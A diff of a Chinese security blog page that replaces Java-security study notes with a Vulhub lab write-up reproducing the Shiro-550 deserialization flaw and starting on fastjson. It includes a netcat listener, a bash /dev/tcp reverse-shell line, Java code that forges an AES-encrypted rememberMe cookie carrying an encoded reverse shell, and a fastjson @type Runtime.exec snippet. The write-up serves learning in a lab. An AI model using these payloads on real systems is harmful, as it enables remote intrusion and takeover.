@@ -14,25 +14,28 @@
   
 
   
-  <title>Java安全 | crumbling&#39;s secret room</title>
+  <title>漏洞复现 | crumbling&#39;s secret room</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 
   <link rel="preload" href="/css/fonts/Roboto-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous">
   <link rel="preload" href="/css/fonts/Roboto-Bold.ttf" as="font" type="font/ttf" crossorigin="anonymous">
   <link rel="preload" href="/css/fonts/MaterialSymbolsRounded.woff2" as="font" type="font/woff2" crossorigin="anonymous">
 
-  <meta name="description" content="看到大神还有学长都认可近几年java安全相关的内容会成为主流，之前学开发也是做的java，所以来专精一手java安全 [Java Web安全] (javasec.org)](https:&#x2F;&#x2F;www.javasec.org&#x2F;) 感觉比较硬核，所以大致记点摘点看懂了的，随便写点感觉比较重要但是没理解全或者没看完的内容和标题 目录 Java基础ClassLoader（类加载机制）Java类都需要经过JV">
+  <meta name="description" content="主要是对一些经典漏洞复现的记录，参考Vulhub 环境kali+vulhub靶场 shiro550 fastjson反序列化漏洞 TODO Shiro 550shiro反序列化漏洞，CVE-2016-4437 response中若有rememberMe&#x3D;deleteMe，则表示使用了shiro框架 而bp的插件BurpShiroPassiveScan可以进行检测并报出漏洞 原理shiro框架提供了">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Java安全">
-<meta property="og:url" content="http://example.com/2024/05/29/Java%E5%AE%89%E5%85%A8/index.html">
+<meta property="og:title" content="漏洞复现">
+<meta property="og:url" content="http://example.com/2024/06/15/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.html">
 <meta property="og:site_name" content="crumbling&#39;s secret room">
-<meta property="og:description" content="看到大神还有学长都认可近几年java安全相关的内容会成为主流，之前学开发也是做的java，所以来专精一手java安全 [Java Web安全] (javasec.org)](https:&#x2F;&#x2F;www.javasec.org&#x2F;) 感觉比较硬核，所以大致记点摘点看懂了的，随便写点感觉比较重要但是没理解全或者没看完的内容和标题 目录 Java基础ClassLoader（类加载机制）Java类都需要经过JV">
+<meta property="og:description" content="主要是对一些经典漏洞复现的记录，参考Vulhub 环境kali+vulhub靶场 shiro550 fastjson反序列化漏洞 TODO Shiro 550shiro反序列化漏洞，CVE-2016-4437 response中若有rememberMe&#x3D;deleteMe，则表示使用了shiro框架 而bp的插件BurpShiroPassiveScan可以进行检测并报出漏洞 原理shiro框架提供了">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2024-05-29T11:31:11.485Z">
-<meta property="article:modified_time" content="2024-06-08T08:24:29.364Z">
+<meta property="og:image" content="http://example.com/2024/06/15/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240615135909485.png">
+<meta property="article:published_time" content="2024-06-15T02:33:02.154Z">
+<meta property="article:modified_time" content="2024-06-15T09:00:19.088Z">
 <meta property="article:author" content="crumbling">
-<meta property="article:tag" content="Web">
+<meta property="article:tag" content="复现">
+<meta property="article:tag" content="漏洞">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2024/06/15/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240615135909485.png">
   
     <link rel="alternate" href="/atom.xml" title="crumbling's secret room" type="application/atom+xml">
   
@@ -253,7 +256,7 @@
     <div id="content-body">
        
 
-<article id="post-Java安全" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+<article id="post-漏洞复现" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   
     
    
@@ -266,7 +269,7 @@
   
     
       <h1 class="p-name article-title" itemprop="headline name">
-        Java安全
+        漏洞复现
       </h1>
     
   
@@ -274,7 +277,7 @@
 
         <div class='meta-info-bar'>
           <div class="meta-info">
-  <time class="dt-published" datetime="2024-05-29T11:31:11.485Z" itemprop="datePublished">2024-05-29</time>
+  <time class="dt-published" datetime="2024-06-15T02:33:02.154Z" itemprop="datePublished">2024-06-15</time>
 </div>
           <div class="need-seperator meta-info">
             <div class="meta-cate-flex">
@@ -285,60 +288,45 @@
   
           </div>
           <div class="wordcount need-seperator meta-info">
-            1.1k 词 
+            945 词 
           </div>
         </div>
         
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/" rel="tag">Web</a></li></ul>
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%A4%8D%E7%8E%B0/" rel="tag">复现</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E/" rel="tag">漏洞</a></li></ul>
 
       </header>
       <div class="e-content article-entry" itemprop="articleBody">
         
-          <p>看到大神还有学长都认可近几年java安全相关的内容会成为主流，之前学开发也是做的java，所以来专精一手java安全</p>
-<p>[Java Web安全] (javasec.org)](<a target="_blank" rel="noopener" href="https://www.javasec.org/">https://www.javasec.org/</a>)</p>
-<p>感觉比较硬核，所以大致记点摘点看懂了的，随便写点感觉比较重要但是没理解全或者没看完的内容和标题</p>
-<p><a href="#">目录</a></p>
-<h1 id="Java基础"><a href="#Java基础" class="headerlink" title="Java基础"></a>Java基础</h1><h2 id="ClassLoader（类加载机制）"><a href="#ClassLoader（类加载机制）" class="headerlink" title="ClassLoader（类加载机制）"></a>ClassLoader（类加载机制）</h2><p>Java类都需要经过JVM加载才能运行，ClassLoader的主要作用就是Java类文件的加载</p>
-<blockquote>
-<p><code>ClassLoader</code>类有如下核心方法：</p>
-<ol>
-<li><code>loadClass</code>（加载指定的Java类）</li>
-<li><code>findClass</code>（查找指定的Java类）</li>
-<li><code>findLoadedClass</code>（查找JVM已经加载过的类）</li>
-<li><code>defineClass</code>（定义一个Java类）</li>
-<li><code>resolveClass</code>（链接指定的Java类）</li>
-</ol>
-</blockquote>
-<h3 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h3><p><code>URLClassLoader</code>继承了<code>ClassLoader</code>，且提供了加载远程资源的能力，在写漏洞利用的<code>payload</code>或者<code>webshell</code>的时候可以加载远程的jar来实现远程的类方法调用</p>
-<h3 id="涉及漏洞"><a href="#涉及漏洞" class="headerlink" title="涉及漏洞"></a>涉及漏洞</h3><h4 id="jsp自定义类加载后门"><a href="#jsp自定义类加载后门" class="headerlink" title="jsp自定义类加载后门"></a>jsp自定义类加载后门</h4><h4 id="BCEL-ClassLoader"><a href="#BCEL-ClassLoader" class="headerlink" title="BCEL ClassLoader"></a>BCEL ClassLoader</h4><p>BCEL是一个用于分析、创建和操纵Java类文件的工具库，其类加载器在解析类名时会对ClassName中有$$$BCEL$$$标识的类做特殊处理，这一特性可以被用于Payload编写。影响于BCEL&lt;6.0</p>
-<h4 id="BCEL-FastJson攻击链分析"><a href="#BCEL-FastJson攻击链分析" class="headerlink" title="BCEL FastJson攻击链分析"></a>BCEL FastJson攻击链分析</h4><h4 id="Xalan"><a href="#Xalan" class="headerlink" title="Xalan"></a>Xalan</h4><h2 id="Java反射"><a href="#Java反射" class="headerlink" title="Java反射"></a>Java反射</h2><p>反射机制是Java非常重要的动态特性，可以获取类的成员方法(<code>Methods</code>)、成员变量(<code>Fields</code>)、构造方法(<code>Constructors</code>)等信息，还可以动态创建Java类实例、调用类方法、修改类成员变量值等。</p>
-<h3 id="获取Class对象"><a href="#获取Class对象" class="headerlink" title="获取Class对象"></a>获取Class对象</h3><p>没有Class对象Java就没有地方操作反射，所以需要先获取Class对象</p>
-<ol>
-<li><code>className.class</code></li>
-<li><code>Class.forName(className)</code>。</li>
-<li><code>classLoader.loadClass(className);</code></li>
-</ol>
-<p>数组类型和Runtime类稍有不同</p>
-<h3 id="反射Runtime"><a href="#反射Runtime" class="headerlink" title="反射Runtime"></a>反射Runtime</h3><p>java.lang.Runtime中有个可以执行本地命令的exec方法，在payload中可以用于执行本地系统命令，而Runtime的构造方法往往是私有的，无法直接<code>Runtime rt = new Runtime();</code>,但反射可以做到在此情况下调用构造方法，即通过反射去修改方法的访问权限(<code>constructor.setAccessible(true)</code>)。</p>
-<p>此外，关于构造方法的获得，<code>runtimeClass1.getDeclaredConstructor</code>和<code>runtimeClass1.getConstructor</code>都可以获取到构造方法，区别在于后者无法获取到私有方法，所以前者使用居多。</p>
-<p>获得对象后，可以进一步调用其中的方法和成员，和构造方法类似，带<code>Declared</code>可以拿到更多，不带的拿到更少。</p>
-<p>方法调用使用<code>method.invoke</code></p>
-<p>没有修改成员变量的权限时可以使用: <code>field.setAccessible(true)</code>;而final修饰的成员变量的修改需要先修改方法（感觉这里怪怪的，大致意思是要先把final去掉？）</p>
-<h2 id="sun-misc-Unsafe"><a href="#sun-misc-Unsafe" class="headerlink" title="sun.misc.Unsafe"></a>sun.misc.Unsafe</h2><p><code>sun.misc.Unsafe</code>是Java底层API(<code>仅限Java内部使用</code><strong>反射可调用</strong>)提供的Java类，提供了底层的<code>内存、CAS、线程调度、类、对象</code>等操作、提供的几乎所有的方法都是不安全的</p>
-<h3 id="allocateInstance"><a href="#allocateInstance" class="headerlink" title="allocateInstance"></a>allocateInstance</h3><p>大概就是无法直接通过反射区创建某个类的实例，那么可以考虑用这个Unsafe下的方法去绕过限制</p>
-<h3 id="defineClass"><a href="#defineClass" class="headerlink" title="defineClass"></a>defineClass</h3><p>ClassLoader可以在JVM中注册一个类,Unsafe的defineClass方法也有同样的功能</p>
-<h2 id="Java文件系统安全"><a href="#Java文件系统安全" class="headerlink" title="Java文件系统安全"></a>Java文件系统安全</h2><p>Java SE中内置了两类文件系统：<code>java.io</code>（基于阻塞模式的IO的文件系统）和<code>java.nio</code>（JDK7+基于NIO.2的文件系统。）</p>
-<h3 id="Java-IO-文件系统"><a href="#Java-IO-文件系统" class="headerlink" title="Java IO 文件系统"></a>Java IO 文件系统</h3><p>Java有个抽象类<code>java.io.FileSystem</code>，抽象了对文件的操作，不同的操作系统有不一样<code>FileSystem</code>,例如 <code>java.io.UnixFileSystem</code>、<code>java.io.WinNTFileSystem</code>。</p>
-<p>其底层会调用动态链接库中c实现的java Native方法</p>
-<p>不是所有的文件操作都在<code>java.io.FileSystem</code>中定义</p>
-<h3 id="Java-NIO-2-文件系统"><a href="#Java-NIO-2-文件系统" class="headerlink" title="Java NIO.2 文件系统"></a>Java NIO.2 文件系统</h3><p>和Java IO是完全独立的，关于文件封装等倒是和IO那边一样，比较显而易见的是有些WAF/RASP只防御了IO，那显然可以通过NIO.2搞点事情</p>
-<h3 id="文件读写"><a href="#文件读写" class="headerlink" title="文件读写"></a>文件读写</h3><ul>
-<li>FileInputStream（读文件）</li>
-<li>FileOutputStream（写文件）</li>
-<li>RandomAccessFile（可以读写文件，类中readxxx方法均在最终调用read0或readBytes方法）</li>
-<li>FileSystemProvider（nio文件系统下的，可以读写）</li>
-<li>其余大部分api都是源自上面几个的封装</li>
-</ul>
+          <p>主要是对一些经典漏洞复现的记录，参考<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub">Vulhub</a></p>
+<p>环境kali+vulhub靶场</p>
+<p><a href="#shiro550">shiro550</a></p>
+<p><a href="#fastjson">fastjson反序列化漏洞 TODO</a></p>
+<h1 id="Shiro-550"><a href="#Shiro-550" class="headerlink" title="Shiro 550"></a><h1 id="shiro550">Shiro 550</h1></h1><p>shiro反序列化漏洞，CVE-2016-4437</p>
+<p><code>response</code>中若有<code>rememberMe=deleteMe</code>，则表示使用了shiro框架</p>
+<p>而bp的插件BurpShiroPassiveScan可以进行检测并报出漏洞</p>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>shiro框架提供了一个记住密码功能，会在cookie中添加一段包含了用户身份信息的加密数据，该加密流程为序列化+AES+base64,验证方式则为base64+AES+反序列化。</p>
+<p>base64和漏洞序列化其实不具备严格意义上的加密效果，加密效果主要体现在AES上，而AES安全的核心在于其密钥key不被泄露，但是shiro&lt;=1.2.4版本中的AES都是用了固定的<strong>kPH+bIxk5D2deZiIxcaaaA==</strong>作为密钥，这就导致攻击者可以自己完成cookie的生成并在其中夹杂恶意代码。</p>
+<h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><p>shiro_exploit.py可以自动检测shiro框架并对密钥进行爆破，这里已经获得了key，暂时不需要。</p>
+<p>并且有shiro_attack-2.2.jar这种综合的图形化工具可以完成后续的漏洞利用，这里暂不采取此方式。</p>
+<p>搭建环境后用给的账号密码登录抓包看一下，能看到<code>Cookie</code>添加了一串东西(如果错误账号密码就只有第一个<code>Cookie</code>)</p>
+<p><img src="/2024/06/15/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240615135909485.png" alt="image-20240615135909485"></p>
+<p>根据前面的原理，开始构造cookie获取反弹shell（可以理解为与ssh等连接方式相反，由受攻击方主动连接攻击方的服务端程序）</p>
+<p><strong>反弹shell</strong>，获取反弹shell的大致流程为：</p>
+<p>攻击端开启监听，比如说<code>nc -l 2333</code>，然后在被攻击端执行<code>bash -i &gt;&amp; /dev/tcp/攻击ip/2333 0&gt;&amp;1</code>（通过2次重定向，将被攻击的给攻击端，再将攻击端的命令给的被攻击端），那么攻击端就会获得被攻击的shell了。</p>
+<p>前面提到该漏洞可以让cookie夹带恶意代码，这里要做的就是夹带这串要被攻击端执行的命令。</p>
+<p>生成rememberMe</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.crumbling;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.codec.Base64;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.codec.CodecSupport;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestRemember</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] payloads = <span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMxLjE4OS84ODg4IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>.getBytes();</span><br><span class="line"></span><br><span class="line">        <span class="type">AesCipherService</span> <span class="variable">aes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">        <span class="type">byte</span>[] key = Base64.decode(CodecSupport.toBytes(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteSource</span> <span class="variable">ciphertext</span> <span class="operator">=</span> aes.encrypt(payloads, key);</span><br><span class="line">        System.out.printf(ciphertext.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>将结果写入Cookie重放应该就能在监听的终端看到被攻击的shell然后进行各种命令行操作了，不过同一台虚拟机作为攻击和被攻击似乎不太好监听，重新摸索一下可能要。不过大致内容就是以上了。</p>
+<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>现实的漏洞挖掘场景，可能在key上出现问题，大致思路是字典爆破，不过更合适的应该是一些自动化的测试工具，应该要比自己人工爆破要快捷。</p>
+<p>以及用于重定向的’&gt;’’&lt;’可能被各种waf啊hids这样的设备检测，可以考虑利用<a target="_blank" rel="noopener" href="https://ares-x.com/tools/runtime-exec">Runtime.exec Payload Generater | AresX’s Blog (ares-x.com)</a>编码</p>
+<h1 id="fastjson反序列化漏洞"><a href="#fastjson反序列化漏洞" class="headerlink" title="fastjson反序列化漏洞"></a><h1 id="fastjson">fastjson反序列化漏洞</h1></h1><p>fastjson是阿里开发的开源json解析库，主要作用是json字符串反序列化到JavaBean</p>
+<p>漏洞影响＜=1.2.48fastjson</p>
+<p>复现环境为1.2.27</p>
+<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>主要是<code>AutoType</code>导致的，而复现环境1.2.27版本在1.2.24后，<code>AutoType</code>已经被禁用，所以需要单独开启。</p>
+<p><code>@type</code>是<code>fastjson</code>中一个特殊注解，用于表示<code>json</code>字符串中某个属性是一个java对象的类型</p>
+<p>一段@type的使用案例</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.Runtime\&quot;&#125;&quot;</span>;</span><br><span class="line">        ParserConfig.getGlobalInstance().addAccept(<span class="string">&quot;java.lang&quot;</span>);</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> (Runtime) JSON.parseObject(json, Object.class);</span><br><span class="line">        runtime.exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiaozi/p/13239046.html">Shiro反序列化漏洞利用汇总（Shiro-550+Shiro-721） - Bypass - 博客园 (cnblogs.com)</a></p>
 
         
       </div>
@@ -351,27 +339,22 @@
   
     
 <nav id="article-nav">
-  <a class="article-nav-btn left "
-    
-      href="/2024/06/15/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"
-      title="漏洞复现"
+  <a class="article-nav-btn left  disabled "
      >
     <i class="fa-solid fa-angle-left"></i>
     <p class="title-text">
-      
-        漏洞复现
         
     </p>
   </a>
   <a class="article-nav-btn right "
     
-      href="/2024/05/27/Portswigger%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/"
-      title="PortSwigger靶场记录"
+      href="/2024/05/29/Java%E5%AE%89%E5%85%A8/"
+      title="Java安全"
      >
 
     <p class="title-text">
       
-        PortSwigger靶场记录
+        Java安全
         
     </p>
     <i class="fa-solid fa-angle-right"></i>
